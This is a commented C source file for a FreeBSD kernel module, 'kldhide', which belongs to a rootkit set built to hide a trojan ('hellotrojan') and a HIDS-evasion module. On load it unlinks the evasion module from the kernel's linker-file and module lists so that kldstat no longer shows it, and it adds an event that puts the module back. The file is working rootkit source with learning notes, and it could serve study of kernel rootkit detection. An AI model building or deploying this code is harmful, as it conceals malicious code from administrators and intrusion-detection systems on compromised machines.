// OK, so we want to prevent kldstat from displaying the loaded
// rootkit linker file 
// This routine has been modified to add and remove an entry 
// from kldstat's listing.
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>

#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <sys/dirent.h>

// The two entries below are the one's manipulated by the
// hidsevasion module. 
// Filehiding module will hide the trojan from file listings.
// Finally kldhide will remove the entry from the module and
// linker file lists so that kldstat doesnt display it.

#define ORIGINAL "./hellotrue"
#define TROJAN "./hellotrojan"

#define T_NAME "hellotrojan"
#define ROOTKIT1 "hidsevasion.ko"
#define MODULE1 "hidsevasion"
#define ROOTKIT2 "filehiding.ko"
#define MODULE2 "filehiding"
#define ROOTKIT3 "kldhide.ko"
#define MODULE3 "kldhide"

// Linker_files is the list of all linker files, when
// a module is loaded its linker file struct is added
// to this list.
// /sys/kern/kern_linker.c defines the list below.

extern linker_file_list_t linker_files;

// The next file id, is the global variable that holds
// the linker file id, for the next linker file that is
// loaded. After this is consumed it is incremented
// waiting readily for the next linker file to come along
// next_file_id is declared in /sys/kern/kern_linker.c
extern int next_file_id;

// The defines below are from kernel source code, reproduced here.
// The next linker file id is obtained by the below logic. 
// Essentially it means that the existing set of ids is searched
// in a linear fashion searching whether the id already exist
// - if it does then a new id is manufactured by incrementing
// the next_file_id. 
#define	KLD_LOCK_ASSERT() do {						\
	if (!cold)							\
		sx_assert(&kld_sx, SX_XLOCKED);				\
} while (0)

#define	LINKER_GET_NEXT_FILE_ID(a) do {					\
	linker_file_t lftmp;						\
									\
	KLD_LOCK_ASSERT();						\
retry:									\
	TAILQ_FOREACH(lftmp, &linker_files, link) {			\
		if (next_file_id == lftmp->id) {			\
			next_file_id++;					\
			goto retry;					\
		}							\
	}								\
	(a) = next_file_id;						\
} while(0)

typedef TAILQ_HEAD(, module) modulelist_t;

// The modules variable is the list of modules and the nextid
// is the corresponding global variable that holds the next 
// module id.

extern modulelist_t modules;

// This struct below is a shared exclusive lock and is defined in
// /sys/kern/kern_linker.c

extern struct sx kld_sx;
extern int nextid;

// Here is the elusive module struct that I was searching
// and wrote about in another file (hello.c). 

struct module {
	TAILQ_ENTRY(module)	link;
	TAILQ_ENTRY(module)	flink;
	struct linker_file	*file;
	int			refs;
	int			id;
	char			*name;
	modeventhand_t		handler;
	void			*arg;
	modspecific_t		data;
};

static int load(struct module * module, int cmd, void * arg) {

// The three pointers below are needed because we want to
// manipulate linker files, modules etc. 

// I also figured out how to pass arguments to this event handler.
// the module_data_t struct's third parameter will be passed
// in as the value of arg. Thus in the case of this load event handler
// I can pass in the string "kldhide" as the third parameter 
// and then cast arg to a char * and thus access its value.

	struct linker_file *lf;
	struct module * mod;
	unsigned long * ptr;

	//uprintf("Args is %lx\n", *((unsigned long *)arg));

	switch(cmd) {
	case MOD_LOAD:

// kld_sx is the struct that is used for obtaining a shared exclusive
// lock on the different kernel objects. The two decrements below
// are needed because I found that every module loaded causes the
// kernel references to be incremented by 2.
// So when we remove the module we decrement by 2, simple, no?

	sx_xlock(&kld_sx);
	(&linker_files)->tqh_first->refs--;
	(&linker_files)->tqh_first->refs--;

// Now we loop through the linker_files array: we are looking for a 
// entry which has a name matching the one we want. Once we find it
// we simply remove that entry from the doubly linked tailq. 
// The next_file_id is decremented in Kong's code, but it simply
// doesnt make any sense to do it. So I commented it out. 
// In any case, the GET_LINKER macro above ensures that the next_file_id
// is unique. I dont think anyone can necessarily track spurious entries
// by checking the list of linker file ids.

	TAILQ_FOREACH(lf, &linker_files, link) {
		if (strcmp(lf->filename, ROOTKIT1) == 0) {
			//next_file_id--;
			TAILQ_REMOVE(&linker_files, lf, link);
// I print out the address of the removed struct so that we can
// reinsert it later. 
			uprintf("Linker File Address %lx\n", (unsigned long) lf);
			break;
		}
	}

// Locks obtained have to be released also. 
	sx_xunlock(&kld_sx);

// Another global struct on which to lock .The kld_sx and modules_sx are
// global structs. Which means that I cant just declare these structs 
// in this program and lock. That lock will not mean anything. These
// structs are declared extern in this program and there is a kernel
// routine which initializes these locks. We need that initialized
// struct.
	sx_xlock(&modules_sx);

// So we iterate through the module list and as before we remove
// the entry with a matching module name. The linker file is the
// container for the module. This can be seen with a kldstat -v
// listing.
// Again nextid decrement is commented. In this case it has to
// be commented because the kernel logic for assigning new
// module ids is just to increment the nextid: there is no other
// check.  So if we decrement the nextid here, it will cause
// a clash when the next module is inserted. An existing module
// id will be reused.

// modules and nextid are defined in the kernel source at
// /sys/kern/kern_module.c
	TAILQ_FOREACH(mod, &modules, link) {
		if (strcmp(mod->name, MODULE1) == 0) { 
			//nextid--;
			TAILQ_REMOVE(&modules, mod, link);
			uprintf("Module address %lx\n",(unsigned long)  mod);
			break;
		}
	}

	sx_xunlock(&modules_sx);

	break;

	case MOD_UNLOAD:
/*
*/
break; 

// So I arbitrarily picked a value 6 for the reinsert logic. 
// Earlier I was wrestling with the question of how to invoke
// module logic just like a sys call. Well the modules consist
// of event handler code, so the only way we can invoke the logic
// is by passing events, simple, no?
// So some other code can pass an event to this module with the
// appropriate integer value for the command id. That command
// id value is passed in as the second parameter to this event
// handler. Then we can switch on it and execute the appropriate
// code. 
	case 6:
// The event handler can also be passed an array of void * 
// pointers, that can point to any type. We just have to
// be careful to do the correct typecast. Otherwise: PANIC!!!
// Here we pass two arguments: a linker file pointer and a 
// module pointer. These addresses are obtained when the
// unload is done (uprintfs above).
// So we have here an array of two addresses, first should
// be of type linker_file * and the second should be a 
// module *. So since an address is essentially an unsigned
// long value, we first cast the void * to that unsigned long
// pointer and then dereference it to get the address, which
// can then be cast into the right type.

// Now for getting at the second parameter we have to first use
// an intermediate ptr value. Because arg is a const pointer and
// any attempt to increment it will be met with stiff resistance
// from the compiler.

	lf = (struct linker_file *) *((unsigned long *)arg);
	ptr = (unsigned long *)arg;
	mod = (struct module *) *(++ptr);
// printfs to check that the hairy casts are all kosher.
	uprintf("Linker name is  is %s\n", lf->filename);	
	uprintf("Module name is %s\n", mod->name);	
// Lock and load folks.
	sx_xlock(&modules_sx);
	
// Here nextid is assigned and incremented, exactly as in line 173
// of the /sys/kern/kern_module.c code. So the logic is, the current
// value of nextid becomes the module id, and then it is incremented
// to wait for the next module that comes along. Now it will be clear
// why the nextid decrement earlier (as in Kong's code) is not a good idea.

	mod->id = nextid++;
// We simply insert it at the end of the queue. 
	TAILQ_INSERT_TAIL(&modules, mod, link);
	
	sx_xunlock(&modules_sx);
	sx_xlock(&kld_sx);
// I dont think the sequence matters, but I first insert the module
// and then the linker files.
// Two time increment here. Corresponds to the two time decrement earlier.
	(&linker_files)->tqh_first->refs++;
	(&linker_files)->tqh_first->refs++;
// Get the right id and then insert. The same type of macro can be
// used for module id also. I am not clear why the kernel code doesnt
// implement it. 
	LINKER_GET_NEXT_FILE_ID(lf->id);
			TAILQ_INSERT_TAIL(&linker_files, lf, link);
	sx_xunlock(&kld_sx);
		break;
	default:
		break;
	}


	return(0);
}

// If we want to pass arguments to the load event handler, then the
// third parameter here can be used.

static moduledata_t kldhide_mod = {
	"kldhide",
	load,
	NULL
	};

DECLARE_MODULE(kldhide, kldhide_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
